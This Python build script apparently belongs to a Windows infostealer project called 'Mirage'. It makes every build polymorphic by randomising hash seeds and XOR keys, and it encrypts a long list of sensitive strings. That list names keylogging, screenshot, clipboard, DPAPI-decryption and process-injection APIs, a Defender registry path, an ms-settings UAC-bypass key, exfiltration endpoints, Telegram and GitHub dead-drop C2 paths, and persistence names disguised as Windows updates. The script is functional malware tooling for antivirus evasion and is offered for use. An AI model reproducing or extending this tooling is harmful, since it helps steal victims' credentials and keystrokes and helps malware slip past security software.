#!/usr/bin/env python3
"""
make_polymorphic.py — Regenerate per-build crypto constants.

Each invocation produces a UNIQUE build:
  - random MIRAGE_SEED          (hash seed)
  - random MIRAGE_STRING_KEY_ENC (16-byte XOR string key)
  - regenerates engine.c XOR-obfuscated export arrays
  - regenerates hashes.h        (kept consistent, used as reference)

Usage: python3 tools/make_polymorphic.py
"""
import os
import random
import re

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_H = os.path.join(ROOT, "include", "config.h")
ENGINE_C = os.path.join(ROOT, "src", "syscalls", "engine.c")
HASHES_H = os.path.join(ROOT, "include", "hashes.h")

# Export names that get XOR-obfuscated in engine.c (fallback path)
EXPORTS = [
    "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtFreeVirtualMemory",
    "NtWriteVirtualMemory", "NtReadVirtualMemory", "NtClose",
    "NtQuerySystemInformation", "NtQueryInformationProcess", "NtDelayExecution",
    "NtOpenFile", "NtWriteFile", "NtSetInformationProcess", "NtOpenKey",
    "NtQueryValueKey", "NtOpenProcess", "NtCreateThreadEx",
    "NtFlushInstructionCache", "NtCreateEvent", "NtDeleteFile",
    "NtSetInformationFile", "NtCreateFile", "NtEnumerateKey",
]
MODULES = ["ntdll.dll", "win32u.dll"]

# Keep the export-name list above in sync with the one in engine.c.
# The obfuscated array name is derived: "NtFoo" -> _NtFoo_obf


def rotl32(v, n):
    return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF


def gen_seed():
    while True:
        s = random.getrandbits(32)
        if s != 0:
            return s


def gen_key():
    return bytes(random.getrandbits(8) for _ in range(16))


def c_hex_array(data):
    return ", ".join(f"0x{b:02x}" for b in data)


def xor_string(s, key):
    return bytes(ord(s[i]) ^ key[i % 16] for i in range(len(s)))


def hash_bytes(data, seed, iterations):
    h = seed
    for b in data:
        for _ in range(iterations):
            h = rotl32(h, 5)
            h = (h ^ b) & 0xFFFFFFFF
            h = (h * 0x1B873593 + 0x85EBCA6B) & 0xFFFFFFFF
    return h


def hash_module(s, seed, key):
    enc = bytes(ord(s[i]) ^ key[i % 16] for i in range(len(s)))
    # case-insensitive fold
    data = bytearray()
    for b in enc:
        if 0x41 <= b <= 0x5A:
            b += 32
        data.append(b)
    return hash_bytes(data, seed, 28)


def hash_func(s, seed, key):
    enc = bytes(ord(s[i]) ^ key[i % 16] for i in range(len(s)))
    return hash_bytes(enc, seed, 27)


def rewrite_config(seed, key):
    with open(CONFIG_H, "r", encoding="utf-8") as f:
        text = f.read()

    # MIRAGE_SEED
    text = re.sub(
        r"#define MIRAGE_SEED\s+0x[0-9a-fA-F]+",
        f"#define MIRAGE_SEED            0x{seed:08X}",
        text,
        count=1,
    )

    # MIRAGE_STRING_KEY_ENC block (two comment lines + closing)
    key_line = "    " + ", ".join(f"0x{b:02x}" for b in key) + "   /* polymorphic */"
    pattern = re.compile(
        r"static const unsigned char MIRAGE_STRING_KEY_ENC\[16\] = \{[^}]*\}[,;]?\s*"
    )
    new_block = (
        "static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {\n"
        f"{key_line}\n"
        "};\n"
    )
    text, n = pattern.subn(new_block, text, count=1)
    if n != 1:
        raise SystemExit("[!] config.h: MIRAGE_STRING_KEY_ENC block not found")

    with open(CONFIG_H, "w", encoding="utf-8") as f:
        f.write(text)


def rewrite_engine(seed, key):
    with open(ENGINE_C, "r", encoding="utf-8") as f:
        text = f.read()

    start_marker = "/* ═══════ XOR-obfuscated export names ══════════════════════════ */"
    end_marker = "static void deobf_str"
    start = text.index(start_marker)
    end = text.index(end_marker)
    if start < 0 or end < 0:
        raise SystemExit("[!] engine.c: obfuscated block markers not found")

    lines = [start_marker, ""]
    for name in EXPORTS:
        obf = xor_string(name, key)
        var = name.replace(".", "_")
        lines.append(
            f"static const unsigned char _{var}_obf[{len(obf)}] = "
            f"{{ {c_hex_array(obf)} }};"
        )
    obf = xor_string("ntdll.dll", key)
    lines.append(
        f"static const unsigned char _ntdll_dll_obf[{len(obf)}] = "
        f"{{ {c_hex_array(obf)} }};"
    )
    lines.append("")

    new_block = "\n".join(lines)
    text = text[:start] + new_block + text[end:]

    with open(ENGINE_C, "w", encoding="utf-8") as f:
        f.write(text)


def rewrite_encrypted_strings(key):
    """Generate enc_strings.h with XOR-encrypted string arrays for all sensitive strings."""
    enc_strings_h = os.path.join(ROOT, "include", "enc_strings.h")

    # Master list of all sensitive strings to encrypt
    # Category prefix determines the C identifier: enc_<sanitized_name>
    strings = [
        # DLL names
        ("ntdll", "ntdll.dll"),
        ("kernel32", "kernel32.dll"),
        ("advapi32", "advapi32.dll"),
        ("user32", "user32.dll"),
        ("rstrtmgr", "rstrtmgr.dll"),
        ("gdi32", "gdi32.dll"),
        ("ws2_32", "ws2_32.dll"),
        ("shell32", "shell32.dll"),
        ("crypt32", "crypt32.dll"),
        ("bcrypt", "bcrypt.dll"),
        ("ole32", "ole32.dll"),
        ("oleaut32", "oleaut32.dll"),
        ("ncrypt", "ncrypt.dll"),
        ("secur32", "secur32.dll"),
        # Function names (for PEB-walk resolution)
        ("FindFirstFileA", "FindFirstFileA"),
        ("FindNextFileA", "FindNextFileA"),
        ("FindClose", "FindClose"),
        ("CreateFileA", "CreateFileA"),
        ("ReadFile", "ReadFile"),
        ("WriteFile", "WriteFile"),
        ("CreateDirectoryA", "CreateDirectoryA"),
        ("GetFileAttributesA", "GetFileAttributesA"),
        ("CopyFileA", "CopyFileA"),
        ("DeleteFileA", "DeleteFileA"),
        ("MoveFileA", "MoveFileA"),
        ("GetEnvironmentVariableA", "GetEnvironmentVariableA"),
        ("SetWindowsHookExW", "SetWindowsHookExW"),
        ("CallNextHookEx", "CallNextHookEx"),
        ("UnhookWindowsHookEx", "UnhookWindowsHookEx"),
        ("GetKeyState", "GetKeyState"),
        ("GetForegroundWindow", "GetForegroundWindow"),
        ("GetWindowTextW", "GetWindowTextW"),
        ("GetAsyncKeyState", "GetAsyncKeyState"),
        ("MapVirtualKeyW", "MapVirtualKeyW"),
        ("GetKeyboardLayout", "GetKeyboardLayout"),
        ("ToUnicodeEx", "ToUnicodeEx"),
        ("GetTickCount64", "GetTickCount64"),
        ("GetTickCount", "GetTickCount"),
        ("GetDC", "GetDC"),
        ("ReleaseDC", "ReleaseDC"),
        ("CreateCompatibleDC", "CreateCompatibleDC"),
        ("DeleteDC", "DeleteDC"),
        ("CreateCompatibleBitmap", "CreateCompatibleBitmap"),
        ("SelectObject", "SelectObject"),
        ("BitBlt", "BitBlt"),
        ("GetDIBits", "GetDIBits"),
        ("DeleteObject", "DeleteObject"),
        ("OpenClipboard", "OpenClipboard"),
        ("CloseClipboard", "CloseClipboard"),
        ("GetClipboardData", "GetClipboardData"),
        ("GlobalLock", "GlobalLock"),
        ("GlobalUnlock", "GlobalUnlock"),
        ("EmptyClipboard", "EmptyClipboard"),
        ("SetClipboardData", "SetClipboardData"),
        ("GlobalAlloc", "GlobalAlloc"),
        ("RegOpenKeyExW", "RegOpenKeyExW"),
        ("RegCreateKeyExW", "RegCreateKeyExW"),
        ("RegSetValueExW", "RegSetValueExW"),
        ("RegDeleteKeyW", "RegDeleteKeyW"),
        ("RegCloseKey", "RegCloseKey"),
        ("RegQueryValueExW", "RegQueryValueExW"),
        ("RegOpenKeyExA", "RegOpenKeyExA"),
        ("RegQueryValueExA", "RegQueryValueExA"),
        ("CreateProcessA", "CreateProcessA"),
        ("VirtualAllocEx", "VirtualAllocEx"),
        ("WriteProcessMemory", "WriteProcessMemory"),
        ("CreateRemoteThread", "CreateRemoteThread"),
        ("OpenProcess", "OpenProcess"),
        ("GetModuleHandleA", "GetModuleHandleA"),
        ("GetModuleHandleW", "GetModuleHandleW"),
        ("GetProcAddress", "GetProcAddress"),
        ("LoadLibraryA", "LoadLibraryA"),
        ("HeapAlloc", "HeapAlloc"),
        ("HeapFree", "HeapFree"),
        ("HeapReAlloc", "HeapReAlloc"),
        ("GetProcessHeap", "GetProcessHeap"),
        ("GetComputerNameA", "GetComputerNameA"),
        ("GetDiskFreeSpaceExA", "GetDiskFreeSpaceExA"),
        ("GetCursorPos", "GetCursorPos"),
        ("GetKeyboardLayoutList", "GetKeyboardLayoutList"),
        ("GetSystemDefaultLangID", "GetSystemDefaultLangID"),
        ("GetTimeZoneInformation", "GetTimeZoneInformation"),
        ("LookupPrivilegeValueW", "LookupPrivilegeValueW"),
        ("AdjustTokenPrivileges", "AdjustTokenPrivileges"),
        ("OpenProcessToken", "OpenProcessToken"),
        ("GetSystemTimeAsFileTime", "GetSystemTimeAsFileTime"),
        ("GetFileSize", "GetFileSize"),
        ("SetFilePointer", "SetFilePointer"),
        ("SetFilePointerEx", "SetFilePointerEx"),
        ("FlushFileBuffers", "FlushFileBuffers"),
        ("MultiByteToWideChar", "MultiByteToWideChar"),
        ("WideCharToMultiByte", "WideCharToMultiByte"),
        ("GetLogicalDriveStringsW", "GetLogicalDriveStringsW"),
        ("QueryDosDeviceW", "QueryDosDeviceW"),
        ("CreateToolhelp32Snapshot", "CreateToolhelp32Snapshot"),
        ("Process32FirstW", "Process32FirstW"),
        ("Process32NextW", "Process32NextW"),
        ("GetSystemMetrics", "GetSystemMetrics"),
        ("CloseHandle", "CloseHandle"),
        ("FindWindowW", "FindWindowW"),
        ("GetWindowThreadProcessId", "GetWindowThreadProcessId"),
        ("DuplicateTokenEx", "DuplicateTokenEx"),
        ("ImpersonateLoggedOnUser", "ImpersonateLoggedOnUser"),
        ("RevertToSelf", "RevertToSelf"),
        ("VirtualAlloc", "VirtualAlloc"),
        ("RtlGetVersion", "RtlGetVersion"),
        # Winsock APIs
        ("WSAStartup", "WSAStartup"),
        ("WSACleanup", "WSACleanup"),
        ("socket", "socket"),
        ("connect", "connect"),
        ("send", "send"),
        ("recv", "recv"),
        ("closesocket", "closesocket"),
        ("getaddrinfo", "getaddrinfo"),
        ("freeaddrinfo", "freeaddrinfo"),
        ("inet_addr", "inet_addr"),
        ("htons", "htons"),
        # NCrypt APIs
        ("NCryptOpenStorageProvider", "NCryptOpenStorageProvider"),
        ("NCryptOpenKey", "NCryptOpenKey"),
        ("NCryptDecrypt", "NCryptDecrypt"),
        ("NCryptFreeObject", "NCryptFreeObject"),
        # BCrypt APIs
        ("BCryptOpenAlgorithmProvider", "BCryptOpenAlgorithmProvider"),
        ("BCryptCloseAlgorithmProvider", "BCryptCloseAlgorithmProvider"),
        ("BCryptSetProperty", "BCryptSetProperty"),
        ("BCryptGenerateSymmetricKey", "BCryptGenerateSymmetricKey"),
        ("BCryptDeriveKeyPBKDF2", "BCryptDeriveKeyPBKDF2"),
        ("BCryptDecrypt", "BCryptDecrypt"),
        ("BCryptDestroyKey", "BCryptDestroyKey"),
        ("BCryptCreateHash", "BCryptCreateHash"),
        ("BCryptHashData", "BCryptHashData"),
        ("BCryptFinishHash", "BCryptFinishHash"),
        ("BCryptDestroyHash", "BCryptDestroyHash"),
        ("BCryptGenRandom", "BCryptGenRandom"),
        # Crypt32 / DPAPI
        ("CryptUnprotectData", "CryptUnprotectData"),
        ("CryptAcquireContextA", "CryptAcquireContextA"),
        ("CryptGenRandom", "CryptGenRandom"),
        ("CryptReleaseContext", "CryptReleaseContext"),
        # Advapi32
        ("SystemFunction036", "SystemFunction036"),
        # COM (ole32)
        ("CoInitializeEx", "CoInitializeEx"),
        ("CoCreateInstance", "CoCreateInstance"),
        ("CoSetProxyBlanket", "CoSetProxyBlanket"),
        ("CoUninitialize", "CoUninitialize"),
        # Advapi32 SID
        ("AllocateAndInitializeSid", "AllocateAndInitializeSid"),
        ("CheckTokenMembership", "CheckTokenMembership"),
        ("FreeSid", "FreeSid"),
        # Kernel32
        ("CreateProcessW", "CreateProcessW"),
        ("RegDeleteValueW", "RegDeleteValueW"),
        ("WaitForSingleObject", "WaitForSingleObject"),
        ("ExitProcess", "ExitProcess"),
        ("VirtualFree", "VirtualFree"),
        ("VirtualFreeEx", "VirtualFreeEx"),
        ("CreateThread", "CreateThread"),
        ("Sleep", "Sleep"),
        ("GetCurrentProcess", "GetCurrentProcess"),
        ("GetCurrentProcessId", "GetCurrentProcessId"),
        ("GetLastError", "GetLastError"),
        ("TerminateProcess", "TerminateProcess"),
        ("GetCommandLineA", "GetCommandLineA"),
        ("GetModuleFileNameA", "GetModuleFileNameA"),
        ("GetTempPathA", "GetTempPathA"),
        ("GetLocalTime", "GetLocalTime"),
        ("GetFinalPathNameByHandleW", "GetFinalPathNameByHandleW"),
        ("SHGetFolderPathA", "SHGetFolderPathA"),
        ("LocalFree", "LocalFree"),
        ("ResumeThread", "ResumeThread"),
        ("GetExitCodeThread", "GetExitCodeThread"),
        ("InitializeCriticalSection", "InitializeCriticalSection"),
        ("DeleteCriticalSection", "DeleteCriticalSection"),
        ("EnterCriticalSection", "EnterCriticalSection"),
        ("LeaveCriticalSection", "LeaveCriticalSection"),
        # Winsock extras
        ("WSASocketW", "WSASocketW"),
        ("accept", "accept"),
        ("bind", "bind"),
        ("listen", "listen"),
        ("setsockopt", "setsockopt"),
        ("getsockname", "getsockname"),
        ("htonl", "htonl"),
        ("ntohs", "ntohs"),
        # OLE/COM helpers
        ("SysAllocStringByteLen", "SysAllocStringByteLen"),
        ("SysFreeString", "SysFreeString"),
        ("SysStringByteLen", "SysStringByteLen"),
        # User32 GUI
        ("CreateWindowExW", "CreateWindowExW"),
        ("RegisterClassW", "RegisterClassW"),
        ("DefWindowProcW", "DefWindowProcW"),
        ("DispatchMessageW", "DispatchMessageW"),
        ("GetMessageW", "GetMessageW"),
        ("TranslateMessage", "TranslateMessage"),
        ("PostMessageW", "PostMessageW"),
        ("DestroyWindow", "DestroyWindow"),
        ("PostQuitMessage", "PostQuitMessage"),
        ("wsprintfW", "wsprintfW"),
        ("WinExec", "WinExec"),
        ("VirtualProtect", "VirtualProtect"),
        # Nt syscalls (for PEB-walk resolution in detection/browser/cleanup)
        ("NtAllocateVirtualMemory", "NtAllocateVirtualMemory"),
        ("NtClose", "NtClose"),
        ("NtCreateFile", "NtCreateFile"),
        ("NtCreateSection", "NtCreateSection"),
        ("NtCreateThreadEx", "NtCreateThreadEx"),
        ("NtDelayExecution", "NtDelayExecution"),
        ("NtFlushInstructionCache", "NtFlushInstructionCache"),
        ("NtFreeVirtualMemory", "NtFreeVirtualMemory"),
        ("NtGetNextProcess", "NtGetNextProcess"),
        ("NtMapViewOfSection", "NtMapViewOfSection"),
        ("NtOpenFile", "NtOpenFile"),
        ("NtOpenKey", "NtOpenKey"),
        ("NtOpenProcess", "NtOpenProcess"),
        ("NtProtectVirtualMemory", "NtProtectVirtualMemory"),
        ("NtQueryInformationProcess", "NtQueryInformationProcess"),
        ("NtQuerySystemInformation", "NtQuerySystemInformation"),
        ("NtQueryValueKey", "NtQueryValueKey"),
        ("NtReadVirtualMemory", "NtReadVirtualMemory"),
        ("NtSetInformationProcess", "NtSetInformationProcess"),
        ("NtTerminateProcess", "NtTerminateProcess"),
        ("NtWriteFile", "NtWriteFile"),
        ("NtWriteVirtualMemory", "NtWriteVirtualMemory"),
        # Additional APIs not yet in list
        ("CopyFileW", "CopyFileW"),
        ("CreateFileMappingA", "CreateFileMappingA"),
        ("DeleteFileW", "DeleteFileW"),
        ("FindFirstFileW", "FindFirstFileW"),
        ("FindNextFileW", "FindNextFileW"),
        ("GetClipboardSequenceNumber", "GetClipboardSequenceNumber"),
        ("GetEnvironmentVariableW", "GetEnvironmentVariableW"),
        ("GetModuleFileNameW", "GetModuleFileNameW"),
        ("GetTempPathW", "GetTempPathW"),
        ("LdrGetProcedureAddress", "LdrGetProcedureAddress"),
        ("LdrLoadDll", "LdrLoadDll"),
        ("MapViewOfFile", "MapViewOfFile"),
        ("MoveFileExW", "MoveFileExW"),
        ("RmEndSession", "RmEndSession"),
        ("RmGetList", "RmGetList"),
        ("RmRegisterResources", "RmRegisterResources"),
        ("RmStartSession", "RmStartSession"),
        ("UnmapViewOfFile", "UnmapViewOfFile"),
        # Registry paths (narrow)
        ("reg_defender", "SOFTWARE\\\\Microsoft\\\\Windows Defender"),
        ("reg_mssettings", "Software\\\\Classes\\\\ms-settings"),
        ("reg_steam", "SOFTWARE\\\\Valve\\\\Steam"),
        ("reg_environment", "Environment"),
        # HTTP endpoints
        ("boundary_mirage", "----MirageBoundary"),
        ("boundary_zialfi_chunk", "----ZialfiChunkBoundary7XkR9fL2"),
        ("boundary_zialfi_complete", "----ZialfiCompleteBoundary1Yz8Wk3P"),
        ("api_log", "/api/log"),
        ("api_log_chunk", "/api/log/chunk"),
        ("api_log_complete", "/api/log/complete"),
        ("github_api", "api.github.com"),
        ("github_releases_path", "/repos/{s}/{s}/releases/latest"),
        ("telegram_host", "t.me"),
        ("telegram_path", "/s/{s}"),
        # Persistence names
        ("persist_mirage_update", "MirageUpdate"),
        ("persist_windows_helper", "WindowsHelper.exe"),
        ("persist_windows_update", "WindowsUpdate"),
        ("persist_notepad", "notepad.exe"),
        # Wide registry paths (UTF-16LE bytes, XOR'd)
        ("wreg_defender", "SOFTWARE\\\\Microsoft\\\\Windows Defender"),
        ("wreg_mssettings", "Software\\\\Classes\\\\ms-settings"),
        # Config values
        ("changeme", "changeme"),
    ]

    lines = []
    lines.append("// Auto-generated by make_polymorphic.py — DO NOT EDIT")
    lines.append("// XOR-encrypted strings for .rdata obfuscation")
    lines.append("")
    lines.append("#ifndef MIRAGE_ENC_STRINGS_H")
    lines.append("#define MIRAGE_ENC_STRINGS_H")
    lines.append("")
    lines.append("#include <stdint.h>")
    lines.append("#include <stddef.h>")
    lines.append("")
    lines.append("/* Decrypt helper — XOR with MIRAGE_STRING_KEY_ENC[16] from config.h */")
    lines.append("#include \"config.h\"")
    lines.append("")
    lines.append("static inline void enc_decrypt(const uint8_t *enc, size_t len, char *out) {")
    lines.append("    for (size_t i = 0; i < len; i++)")
    lines.append("        out[i] = (char)(enc[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);")
    lines.append("    out[len] = '\\0';")
    lines.append("}")
    lines.append("")
    lines.append("static inline void enc_decrypt_wide(const uint8_t *enc, size_t enc_len, wchar_t *out) {")
    lines.append("    /* enc is XOR'd narrow bytes; decrypt to narrow then widen */")
    lines.append("    for (size_t i = 0; i < enc_len; i++)")
    lines.append("        out[i] = (wchar_t)(enc[i] ^ MIRAGE_STRING_KEY_ENC[i % 16]);")
    lines.append("    out[enc_len] = L'\\0';")
    lines.append("}")
    lines.append("")

    for name, plaintext in strings:
        obf = xor_string(plaintext, key)
        c_name = name.replace(".", "_").replace("\\\\", "_")
        lines.append(f"static const uint8_t enc_{c_name}[{len(obf)}] = {{ {c_hex_array(obf)} }};")
        lines.append(f"#define ENC_{c_name.upper()}_LEN {len(obf)}")
        lines.append("")

    lines.append("#endif /* MIRAGE_ENC_STRINGS_H */")
    lines.append("")

    with open(enc_strings_h, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def rewrite_hashes(seed, key):
    out = []
    out.append("// Auto-generated by make_polymorphic.py")
    out.append("// Do not edit manually")
    out.append("")
    out.append("#ifndef MIRAGE_HASHES_H")
    out.append("#define MIRAGE_HASHES_H")
    out.append("")
    out.append("#include <stdint.h>")
    out.append("")
    out.append("// Module hashes (28 iters, case-insensitive)")
    for m in MODULES:
        h = hash_module(m, seed, key)
        dn = m.upper().replace(".", "_")
        out.append(f"#define HASH_{dn}  0x{h:08X}u")
    out.append("")
    out.append("// Function hashes (27 iters, exact case)")
    for f in ["LdrGetProcedureAddress"] + EXPORTS:
        h = hash_func(f, seed, key)
        dn = f.replace("Nt", "").replace(".", "_")
        out.append(f"#define HASH_{dn}  0x{h:08X}u  // {f}")
    out.append("")
    out.append("#endif")
    out.append("")

    with open(HASHES_H, "w", encoding="utf-8") as f:
        f.write("\n".join(out))


def main():
    seed = gen_seed()
    key = gen_key()
    rewrite_config(seed, key)
    rewrite_engine(seed, key)
    rewrite_hashes(seed, key)
    rewrite_encrypted_strings(key)
    print(f"[+] MIRAGE_SEED = 0x{seed:08X}")
    print("[+] MIRAGE_STRING_KEY_ENC = " + " ".join(f"{b:02X}" for b in key))
    print("[+] engine.c XOR arrays regenerated")
    print("[+] hashes.h regenerated")


if __name__ == "__main__":
    main()
